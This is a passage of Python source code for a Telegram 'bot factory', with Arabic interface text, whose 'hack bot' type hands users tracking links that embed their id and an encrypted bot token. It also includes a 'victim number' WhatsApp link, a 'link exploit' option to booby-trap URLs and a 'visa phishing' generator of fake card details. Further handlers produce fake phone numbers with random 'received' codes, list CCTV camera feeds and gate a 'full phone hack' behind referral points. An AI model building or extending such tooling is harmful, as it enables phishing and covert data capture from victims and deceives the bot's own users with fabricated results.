        elif data == "no_main_channel_set":
            query.answer("لم يتم تعيين قناة أساسية لهذا البوت بعد. ℹ️", show_alert=True)
            return

    # --- Factory Bot Specific User Actions (creating sub-bots) ---
    elif bot_type == "factory_bot":
        if data == "create_bot_from_factory":
            query.answer()
            keyboard = [
                [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
                [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
            ]
            edit_message_text(context.bot, chat_id, message_id,
                              "اختر نوع البوت الذي تريد إنشاءه من المصنع الفرعي: 👇", reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = "await_sub_bot_type_selection"
            return
        
        elif data == "create_hack_bot_sub":
            query.answer()
            edit_message_text(context.bot, chat_id, message_id,
                              "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت اختراق'.")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "hack_bot"}
            return

        elif data == "create_encryption_bot_sub":
            query.answer()
            edit_message_text(context.bot, chat_id, message_id,
                              "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت تشفير py'.")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "encryption_bot"}
            return
        
        elif data == "manage_made_bots_from_factory":
            query.answer()
            # This factory bot's admin_id is the user_id of the current user
            sub_bots = created_bots.get(user_id, []) # Get bots created by this factory's admin
            if not sub_bots:
                edit_message_text(context.bot, chat_id, message_id,
                                  "⚠️ لم تقم بإنشاء أي بوتات من هذا المصنع الفرعي بعد. 😔")
                return
            keyboard = []
            for bot_data_sub in sub_bots:
                keyboard.append([InlineKeyboardButton(f"🤖 {bot_data_sub['username']} ({bot_data_sub['bot_type']})", callback_data=f"info_sub_{bot_data_sub['username']}")])
            edit_message_text(context.bot, chat_id, message_id,
                              "اختر البوت الذي تريد إدارته من قائمتك: 👇", reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = "manage_sub_bots"
            return
        
        elif data.startswith("info_sub_"):
            query.answer()
            username = data.split("_", 2)[2]
            keyboard = [[InlineKeyboardButton("🗑 حذف البوت", callback_data=f"delete_sub_{username}")]]
            edit_message_text(context.bot, chat_id, message_id,
                              f"معلومات البوت @{username} ℹ️", reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = f"confirm_delete_sub_{username}"
            return
        
        elif data.startswith("delete_sub_"):
            query.answer()
            username = data.split("_", 2)[2]
            bot_user_states[current_bot_username][user_id] = f"confirm_delete_sub_{username}"
            edit_message_text(context.bot, chat_id, message_id,
                              f"⚠️ هل أنت متأكد من حذف البوت @{username}؟\nإذا كنت متأكد أرسل:\n`delete_sub {username}`",
                              parse_mode=ParseMode.MARKDOWN)
            return

        elif data == "add_factory_admin_sub":
            query.answer()
            send_message(context.bot, chat_id, "الرجاء إرسال معرف (ID) المستخدم الذي تريد إضافته كأدمن لهذا المصنع الفرعي: 👨‍💻")
            bot_user_states[current_bot_username][user_id] = "await_new_factory_admin_id_sub"
            return

        elif data == "remove_factory_admin_sub":
            query.answer()
            send_message(context.bot, chat_id, "الرجاء إرسال معرف (ID) المستخدم الذي تريد حذفه كأدمن من هذا المصنع الفرعي: 🗑️")
            bot_user_states[current_bot_username][user_id] = "await_remove_factory_admin_id_sub"
            return

        elif data == "factory_sub_stats":
            query.answer()
            sub_bots = created_bots.get(user_id, [])
            total_sub_bots = len(sub_bots)
            total_users_in_sub_bots = 0
            for bot_data_sub in sub_bots:
                sub_bot_username = bot_data_sub["username"]
                load_made_bot_settings(sub_bot_username)
                total_users_in_sub_bots += len(made_bot_data[sub_bot_username].get("members", []))
            
            # Factory admins for this specific factory bot
            factory_sub_admins = bot_settings.get("factory_sub_admins", [admin_id])
            
            stats_message = (
                f"📊 *إحصائيات المصنع الفرعي:*\n"
                f"🤖 عدد البوتات المصنوعة من هذا المصنع: {total_sub_bots}\n"
                f"👥 إجمالي عدد المستخدمين في البوتات المصنوعة من هذا المصنع: {total_users_in_sub_bots}\n"
                f"👨‍💻 عدد الأدمنز في هذا المصنع الفرعي: {len(factory_sub_admins)}"
            )
            send_message(context.bot, chat_id, stats_message, parse_mode=ParseMode.MARKDOWN)
            return

        elif data == "broadcast_free_bots_sub":
            query.answer()
            send_message(context.bot, chat_id, "الرجاء إرسال الرسالة التي تريد إذاعتها للبوتات المجانية المصنوعة من هذا المصنع الفرعي: 📢")
            bot_user_states[current_bot_username][user_id] = "await_broadcast_free_bots_message_sub"
            return
        
        elif data == "add_paid_features_sub":
            query.answer()
            send_message(context.bot, chat_id, "الرجاء إرسال توكن البوت الفرعي الذي تريد تفعيل المميزات المدفوعة (قسم الأزرار) له: 💎")
            bot_user_states[current_bot_username][user_id] = "await_paid_features_sub_bot_token"
            return

    # --- Hack Bot Specific User Actions ---
    elif bot_type == "hack_bot":
        # Handle username generation menu
        if data.startswith("get_username_"):
            handle_username_type_selection(update, context)
            return
        elif data == "telegram_usernames_menu":
            telegram_usernames_menu(update, context)
            return
        
        # Handle name decoration menu for all users
        if data == "user_button_name_decorate":
            query.answer()
            keyboard = [
                [InlineKeyboardButton("English 🇬🇧", callback_data="decorate_lang_en")],
                [InlineKeyboardButton("العربية 🇸🇦", callback_data="decorate_lang_ar")],
                [InlineKeyboardButton("الغاء الامر❎", callback_data="back_to_main_user_menu")]
            ]
            edit_message_text(context.bot, chat_id, message_id,
                            "الرجاء اختيار لغة الاسم للزخرفة: 🎨",
                            reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = "await_name_decorate_lang_selection"
            return
        elif data.startswith("decorate_lang_"):
            query.answer()
            lang = data.split("_")[-1]
            if bot_user_states[current_bot_username].get(user_id) == "await_name_decorate_lang_selection":
                if lang == "en":
                    send_message(context.bot, chat_id, "الرجاء إرسال الاسم الإنجليزي المراد زخرفته: ✍️")
                    bot_user_states[current_bot_username][user_id] = "await_name_decorate_input_en"
                elif lang == "ar":
                    send_message(context.bot, chat_id, "الرجاء إرسال الاسم العربي المراد زخرفته: ✍️")
                    bot_user_states[current_bot_username][user_id] = "await_name_decorate_input_ar"
            else:
                send_message(context.bot, chat_id, "حدث خطأ. يرجى البدء من جديد بالضغط على 'زخرفة الاسماء'. 🔄")
                send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
                bot_user_states[current_bot_username][user_id] = None
            return
        
        # Handle Link Check button for all users
        elif data == "user_button_link_check":
            query.answer()
            send_message(context.bot, chat_id, "الرجاء إرسال الرابط الذي تريد فحصه: 🔗")
            bot_user_states[current_bot_username][user_id] = "await_link_check_input"
            return

        # --- Radio Hack Feature ---
        elif data == "user_button_radio_hack":
            query.answer()
            if user_id in bot_user_states[current_bot_username] and isinstance(bot_user_states[current_bot_username][user_id], dict):
                user_radio_state = bot_user_states[current_bot_username][user_id].get("radio_country", "sudan")
            else:
                user_radio_state = "sudan"
                bot_user_states[current_bot_username][user_id] = {"radio_country": "sudan"}

            if user_radio_state == "sudan":
                stations = SUDAN_RADIO_STATIONS
                country_name = "السودان 🇸🇩"
                bot_user_states[current_bot_username][user_id]["radio_country"] = "egypt"
            else:
                stations = EGYPT_RADIO_STATIONS
                country_name = "مصر 🇪🇬"
                bot_user_states[current_bot_username][user_id]["radio_country"] = "sudan"

            message_text = f"محطات الراديو المتاحة في {country_name}:\n\n"
            for station in stations:
                message_text += f"اسم المحطة: {station['name']}\n" + f"رابط البث: {station['url']}\n\n"
            
            send_message(context.bot, chat_id, message_text)
            return

        # --- CCTV Hack Feature ---
        elif data == "user_button_cctv":
            query.answer()
            keyboard = []
            for country in CCTV_CAMERAS.keys():
                keyboard.append([InlineKeyboardButton(country, callback_data=f"cctv_country_{country}")])
            
            keyboard.append([InlineKeyboardButton("رجوع 🔙", callback_data="back_to_main_user_menu")])
            
            edit_message_text(context.bot, chat_id, message_id,
                            "اختر الدولة لعرض كاميرات المراقبة: 🎥",
                            reply_markup=InlineKeyboardMarkup(keyboard))
            bot_user_states[current_bot_username][user_id] = "await_cctv_country_selection"
            return
        
        elif data.startswith("cctv_country_"):
            query.answer()
            country = data.replace("cctv_country_", "")
            camera_links = CCTV_CAMERAS.get(country, [])
            
            if camera_links:
                message_text = f"كاميرات المراقبة المتاحة في {country}:\n\n"
                for i, link in enumerate(camera_links):
                    message_text += f"{i+1}. {link}\n"
            else:
                message_text = f"لا توجد كاميرات مراقبة متاحة لـ {country} حاليًا. 😔"
            
            send_message(context.bot, chat_id, message_text)
            bot_user_states[current_bot_username][user_id] = None
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return

        # --- Buttons using links from index.py (Modified) ---
        elif data in links:
            query.answer()
            bot_token_for_link = get_bot_token_from_username(current_bot_username)
            if bot_token_for_link:
                encrypted_data = encrypt_token(bot_token_for_link)
                generated_link = f"{links[data]}?id={user_id}&tok={encrypted_data}"
                send_message(context.bot, chat_id, f"تم إنشاء الرابط: 🔗\n`{generated_link}`", parse_mode=ParseMode.MARKDOWN)
            else:
                send_message(context.bot, chat_id, "حدث خطأ: لم يتم العثور على توكن البوت لإنشاء الرابط. ❌")
            return

        # --- Visa Phishing Feature ---
        elif data == "user_button_visa_phishing":
            query.answer()
            message = send_message(context.bot, chat_id, "جاري إنشاء الفيزا... 💳\n[░░░░░░░░░░] 0%")
            
            for i in range(1, 5):
                time.sleep(1)
                progress = i * 25
                progress_bar = "█" * (progress // 10) + "░" * (10 - (progress // 10))
                edit_message_text(context.bot, chat_id, message.message_id,
                                f"جاري إنشاء الفيزا... 💳\n[{progress_bar}] {progress}%")
            
            context.bot.delete_message(chat_id=chat_id, message_id=message.message_id)
            
            visa_details = generate_random_visa_details()
            bot_name_for_visa = current_bot_username
            
            visa_message = (
                f"𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n"
                f"[-] Card Number : `{visa_details['card_number']}`\n"
                f"[-] Expiry : `{visa_details['expiry']}`\n"
                f"[-] CVV : `{visa_details['cvv']}`\n"
                f"[-] Bank : {visa_details['bank']}\n"
                f"[-] Card Type : {visa_details['card_type']}\n"
                f"[-] Country : {visa_details['country']}\n"
                f"[-] Value : {visa_details['value']}\n"
                f"============================\n"
                f"[-] by : @{bot_name_for_visa}"
            )
            send_message(context.bot, chat_id, visa_message, parse_mode=ParseMode.MARKDOWN)
            return

        # --- Link Exploit Feature ---
        elif data == "user_button_link_exploit":
            query.answer()
            send_message(context.bot, chat_id, "أرسل لي رابطًا يبدأ بـ \"https\" لتلغيمه. ⚠️")
            bot_user_states[current_bot_username][user_id] = "await_link_exploit_input"
            return

        # --- Fake Numbers Feature ---
        elif data == "user_button_fake_numbers":
            query.answer()
            fake_number_details = generate_fake_number_details()
            message_text = (
                f"➖ تم الطلب 🛎• \n"
                f"➖ رقم الهاتف ☎️ : `{fake_number_details['phone_number']}`\n"
                f"➖ الدوله : {fake_number_details['country']}\n"
                f"➖ رمز الدوله 🌏 : {fake_number_details['country_code']}\n"
                f"➖ المنصه 🔮 : {fake_number_details['platform']}\n"
                f"➖ تاريخ الانشاء 📅 : {fake_number_details['creation_date']}\n"
                f"➖ وقت الانشاء ⏰ : {fake_number_details['creation_time']}\n"
                f"➖ اضغط ع الرقم لنسخه."
            )
            send_message(context.bot, chat_id, message_text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_fake_number_keyboard(current_bot_username, user_id))
            bot_user_states[current_bot_username][user_id] = {"action": "fake_number_displayed", "details": fake_number_details}
            return
        
        elif data == "fake_number_request_code":
            query.answer()
            if random.choice([True, False]):
                code = ''.join(random.choices(string.digits, k=6))
                send_message(context.bot, chat_id, f"✅ وصل الكود: `{code}`")
            else:
                send_message(context.bot, chat_id, "❌ لم يصل أي كود جديد لهذا الرقم حاليًا. يرجى المحاولة لاحقًا.")
            return

        elif data == "fake_number_change_number":
            query.answer()
            fake_number_details = generate_fake_number_details()
            message_text = (
                f"➖ تم الطلب 🛎• \n"
                f"➖ رقم الهاتف ☎️ : `{fake_number_details['phone_number']}`\n"
                f"➖ الدوله : {fake_number_details['country']}\n"
                f"➖ رمز الدوله 🌏 : {fake_number_details['country_code']}\n"
                f"➖ المنصه 🔮 : {fake_number_details['platform']}\n"
                f"➖ تاريخ الانشاء 📅 : {fake_number_details['creation_date']}\n"
                f"➖ وقت الانشاء ⏰ : {fake_number_details['creation_time']}\n"
                f"➖ اضغط ع الرقم لنسخه."
            )
            edit_message_text(context.bot, chat_id, message_id, message_text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_fake_number_keyboard(current_bot_username, user_id))
            bot_user_states[current_bot_username][user_id] = {"action": "fake_number_displayed", "details": fake_number_details}
            return

        # --- NEW: Full Phone Hack (VIP) Feature ---
        elif data == "user_button_full_phone_hack":
            query.answer()
            user_points = bot_settings["points"].get(user_id, 0)
            required_points = bot_settings.get("payload_points_required", 0) # يمكن أن تكون 0
            
            send_message(context.bot, chat_id,
                        f"مرحبًا! هذه الخيارات مدفوعة بسعر {required_points} نقطة. يمكنك تجميع النقاط وفتحها مجانًا. 🌟\n"
                        f"نقاطك الحالية: {user_points} ✨\n"
                        f"استخدم الأمر /vip لفتح أوامر اختراق الهاتف كاملاً.")
            return
        
        elif data.startswith("full_phone_hack_"):
            query.answer()
            bot_username_for_link = context.bot.username
            referral_link = f"https://t.me/{bot_username_for_link}?start={user_id}"
            send_message(context.bot, chat_id,
                        f"رابط تجميع النقاط الخاص بك 🔗\nعند دخول شخص عبر الرابط سوف تحصل على 1 نقطة. 🎁\nرابط الدعوة الذي يحتوي على يوزر البوت وايدي المستخدم:\n`{referral_link}`\nاستخدم الأمر /free لمعرفة نقاطك.📊",
                        parse_mode=ParseMode.MARKDOWN)
            return

        # Handle custom message buttons for users
        elif data.startswith("custom_msg_btn_"):
            button_name = data.replace("custom_msg_btn_", "")
            for btn in bot_settings["custom_buttons"]:
                if btn["name"] == button_name and btn["type"] == "send_message":
                    message_to_send = btn["value"]
                    message_to_send = message_to_send.replace("#id", str(user_id))
                    message_to_send = message_to_send.replace("#username", f"@{update.effective_user.username}" if update.effective_user.username else "غير متاح")
                    message_to_send = message_to_send.replace("#name", update.effective_user.first_name)
                    send_message(context.bot, chat_id, message_to_send)
                    query.answer()
                    return
            query.answer("زر غير صالح. ❌", show_alert=True)
            return

        # User button actions for AI, Dream Interpret, Image Generation, Text-to-Speech, Azkar
        elif data == "user_button_ai":
            query.answer()
            send_message(context.bot, chat_id, "🤖 أهلاً بك في عالم الذكاء الاصطناعي! \n\nالرجاء إرسال سؤالك الآن: 💬")
            bot_user_states[current_bot_username][user_id] = "await_ai_question"
            return
        elif data == "user_button_dream_interpret":
            query.answer()
            send_message(context.bot, chat_id, "🧙‍♂️ مرحباً بك في تفسير الأحلام! \n\nالرجاء وصف حلمك بالتفصيل: 😴")
            bot_user_states[current_bot_username][user_id] = "await_dream_description"
            return
        elif data == "user_button_blue_genie_game":
            query.answer()
            send_message(context.bot, chat_id, "🧞‍♂️ أهلاً بك في لعبة المارد الأزرق! \n\nفكر في شخصية، حيوان، أو شيء، وسأحاول تخمينه. عندما تكون جاهزًا، أرسل لي 'جاهز' أو ابدأ بوصف بسيط لما تفكر فيه. 🤔")
            bot_user_states[current_bot_username][user_id] = "await_genie_game_start"
            return
        elif data == "user_button_image_search":
            query.answer()
            send_message(context.bot, chat_id, "🎨 أهلاً بك في خدمة إنشاء الصور! \n\nالرجاء وصف الصورة التي تريد إنشاءها: 🖼️")
            bot_user_states[current_bot_username][user_id] = "await_image_description"
            return
        elif data == "user_button_text_to_speech":
            query.answer()
            send_message(context.bot, chat_id, "🔊 أهلاً بك في خدمة تحويل النص إلى صوت! \n\nالرجاء إرسال النص الذي تريد تحويله: ✍️")
            bot_user_states[current_bot_username][user_id] = "await_text_to_speech_input"
            return
        elif data == "user_button_shereen_ai":
            query.answer()
            send_message(context.bot, chat_id, "🎤 أهلاً بك في ذكاء شيرين الاصطناعي! \n\nالرجاء إرسال سؤالك الآن: 💬")
            bot_user_states[current_bot_username][user_id] = "await_shereen_ai_question"
            return
        elif data == "user_button_deepseek_ai":
            query.answer()
            send_message(context.bot, chat_id, "🧠 أهلاً بك في ذكاء ديب سيك الاصطناعي! \n\nالرجاء إرسال سؤالك الآن: 💬")
            bot_user_states[current_bot_username][user_id] = "await_deepseek_ai_question"
            return
        elif data == "user_button_chatgpt_3_5":
            query.answer()
            send_message(context.bot, chat_id, "💬 أهلاً بك في ذكاء ChatGPT-3.5 الاصطناعي! \n\nالرجاء إرسال سؤالك الآن: 💬")
            bot_user_states[current_bot_username][user_id] = "await_chatgpt_3_5_question"
            return
        elif data == "user_button_azkar":
            query.answer("جاري جلب الأذكار... 🕋", show_alert=True)
            azkar_text = get_azkar_via_api(current_bot_username, user_id)
            send_message(context.bot, chat_id, azkar_text, parse_mode=ParseMode.MARKDOWN)
            send_message(context.bot, chat_id,
                        bot_settings["start_message"],
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return
        elif data == "user_button_smart_game":
            query.answer("هذه الميزة قيد التطوير حاليًا. 🚧", show_alert=True)
            return
        elif data == "user_button_victim_number":
            query.answer()
            bot_token_for_link = get_bot_token_from_username(current_bot_username)
            if bot_token_for_link:
                encrypted_data = encrypt_token(bot_token_for_link)
                victim_number_link = f"{links['get_victim_number']}?id={user_id}&tok={encrypted_data}"
                send_message(context.bot, chat_id, f"رابط معرفة رقم الضحية (واتساب): 📲\n`{victim_number_link}`", parse_mode=ParseMode.MARKDOWN)
            else:
                send_message(context.bot, chat_id, "حدث خطأ: لم يتم العثور على توكن البوت لإنشاء الرابط. ❌")
            return

    # --- Admin-specific actions ---
    if user_id != admin_id:
        query.answer() # Answer the query for non-admin users silently
        return

    # Admin actions continue below
    query.answer() # Answer the callback query for admin actions

    if data == 'back':
        edit_message_text(context.bot, chat_id, message_id,
                          "مرحبًا! إليك أوامرك: ⚡📮\n\n1. إدارة المشترڪين والتحكم بهم. 👥\n2. إرسال إذاعات ورسائل موجهة. 📢\n3. ضبط إعدادات الاشتراك الإجباري. 💢\n4. تفعيل أو تعطيل التنبيهات. ✔️❎\n5. إدارة حالة البوت ووضع الاشتراك. 💰🆓",
                          reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = None
    
    elif data == "unban":
        edit_message_text(context.bot, chat_id, message_id,
                          "حسناً عزيزي، أرسل ايدي العضو لإلغاء حظره: 🔱",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "unban"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_unban_id"

    elif data == "ban":
        edit_message_text(context.bot, chat_id, message_id,
                          "حسناً عزيزي، أرسل ايدي العضو لحظره: 🚫",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "ban"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_ban_id"

    elif data == "ofbot":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم إيقاف البوت بنجاح. ❌",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["bot_status"] = "off"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإيقاف البوت @{current_bot_username}.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "obot":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم فتح البوت بنجاح. ✅",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["bot_status"] = "on"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بفتح البوت @{current_bot_username}.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "send":
        edit_message_text(context.bot, chat_id, message_id,
                          "حسناً عزيزي، أرسل رسالتك للإذاعة: 📮",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "send"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_broadcast_message"

    elif data == "forward":
        edit_message_text(context.bot, chat_id, message_id,
                          "حسناً عزيزي، قم بتوجيه الرسالة الآن: 🔄",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "forward"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_forward_message"

    elif data == "dch":
        edit_message_text(context.bot, chat_id, message_id,
                          "أرسل معرف القناة لإزالتها من الاشتراك الإجباري: 🔱",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "dch"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_remove_channel"

    elif data == "m1":
        member_count = len(bot_settings["members"])
        query.answer(f"عدد المشتركين هو: {member_count} 👥", show_alert=True)

    elif data == "pro123":
        edit_message_text(context.bot, chat_id, message_id,
                          "قم بإرسال ايدي الشخص المراد إضافته لقسم المدفوعين: 💰",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "pro123"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_add_paid_user"

    elif data == "frre123":
        edit_message_text(context.bot, chat_id, message_id,
                          "أرسل ايدي الشخص المراد إزالته من الاشتراك المدفوع: 🆓",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "frre123"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_remove_paid_user"

    elif data == "ach":
        edit_message_text(context.bot, chat_id, message_id,
                          "حسناً عزيزي، أرسل معرف قناتك لإضافتها كاشتراك إجباري: 📮",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "ach"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_add_channel"

    elif data == "ofs":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم تعطيل التنبيهات بنجاح. ❎",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["notifications"] = "off"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتعطيل التنبيهات في البوت @{current_bot_username}.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "ons":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم تفعيل التنبيهات بنجاح. ✔️",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["notifications"] = "on"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتفعيل التنبيهات في البوت @{current_bot_username}.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "frre":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم جعل البوت بوضع المجاني. 😊",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["payment_status"] = "free"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بجعل البوت @{current_bot_username} بوضع المجاني.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "pro":
        edit_message_text(context.bot, chat_id, message_id,
                          "تم جعل البوت بوضع المدفوع. 💼",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("عودة 🔙", callback_data="back")]
                          ]))
        bot_settings["payment_status"] = "on"
        save_made_bot_settings(current_bot_username)
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بجعل البوت @{current_bot_username} بوضع المدفوع.",
                         parse_mode=ParseMode.MARKDOWN)

    elif data == "set_start_message":
        edit_message_text(context.bot, chat_id, message_id,
                          "الرجاء إرسال رسالة البدء الجديدة للبوت. يمكنك استخدام تنسيق Markdown. 📝",
                          reply_markup=InlineKeyboardMarkup([
                              [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                          ]))
        bot_settings["rembo_state"] = "set_start_message"
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = "await_start_message"

    elif data == "set_payload_points": # Only for hack_bot
        if bot_type == "hack_bot":
            edit_message_text(context.bot, chat_id, message_id,
                            "الرجاء إرسال عدد النقاط المطلوبة لفتح ميزة اختراق الهاتف كاملاً (يمكن أن تكون 0): 🔢",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                            ]))
            bot_settings["rembo_state"] = "set_payload_points"
            save_made_bot_settings(current_bot_username)
            bot_user_states[current_bot_username][user_id] = "await_payload_points"
        else:
            query.answer("هذه الميزة متاحة فقط لبوت الاختراق. 🚫", show_alert=True)
        return

    elif data == "set_main_channel_link": # Only for encryption_bot
        if bot_type == "encryption_bot":
            edit_message_text(context.bot, chat_id, message_id,
                            "الرجاء إرسال رابط القناة الأساسية (مثال: https://t.me/your_channel أو @your_channel): 🫅",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("الغاء الأمر ❎", callback_data="back")]
                            ]))
            bot_settings["rembo_state"] = "set_main_channel_link"
            save_made_bot_settings(current_bot_username)
            bot_user_states[current_bot_username][user_id] = {"action": "await_main_channel_link"} # Set state for message handler
        else:
            query.answer("هذه الميزة متاحة فقط لبوت التشفير. 🚫", show_alert=True)
        return

    elif data == "download_bot_data":
        query.answer("جاري تجهيز ملفات البيانات... 💾", show_alert=True)
        
        bot_data_folder = os.path.join(DATABASE_DIR, current_bot_username)
        zip_file_path = f"{bot_data_folder}_data.zip"
        
        try:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Add bot's main settings file
                settings_file = get_made_bot_data_path(current_bot_username)
                if os.path.exists(settings_file):
                    zipf.write(settings_file, os.path.basename(settings_file))
                
                # Add other relevant files from the bot's specific directory if it exists
                if os.path.exists(bot_data_folder) and os.path.isdir(bot_data_folder):
                    for root, _, files in os.walk(bot_data_folder):
                        for file in files:
                            if file.endswith(('.json', '.txt')): # Only include json and txt files
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, bot_data_folder)
                                zipf.write(file_path, os.path.join(current_bot_username, arcname))
            
            with open(zip_file_path, 'rb') as f:
                context.bot.send_document(chat_id=chat_id, document=f, caption=f"بيانات البوت @{current_bot_username} 📊")
            
            os.remove(zip_file_path) # Clean up the zip file
            send_message(context.bot, chat_id, "✅ تم إرسال بيانات البوت بنجاح.")
            if user_id != MAIN_ADMIN_ID:
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار للمالك:*\nقام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بتحميل بيانات البوت @{current_bot_username}.",
                             parse_mode=ParseMode.MARKDOWN)

        except Exception as e:
            logging.error(f"خطأ في ضغط أو إرسال بيانات البوت لـ @{current_bot_username}: {e}")
            send_message(context.bot, chat_id, "❌ حدث خطأ أثناء تجهيز أو إرسال بيانات البوت.")
        
        bot_settings["rembo_state"] = None
        save_made_bot_settings(current_bot_username)
        bot_user_states[current_bot_username][user_id] = None
        return

    # --- Custom Buttons Panel (only for hack_bot) ---
    elif data == "buttons_panel":
        if bot_type == "hack_bot":
            keyboard = [
                [InlineKeyboardButton("إضافة زر ➕", callback_data="add_button")],
                [InlineKeyboardButton("حذف زر 🗑️", callback_data="delete_button")],
                [InlineKeyboardButton("عودة 🔙", callback_data="back")]
            ]
            edit_message_text(context.bot, chat_id, message_id,
                            "اختر من الأزرار التالية: 🖲️",
                            reply_markup=InlineKeyboardMarkup(keyboard))
            bot_settings["rembo_state"] = "buttons_panel"
            save_made_bot_settings(current_bot_username)
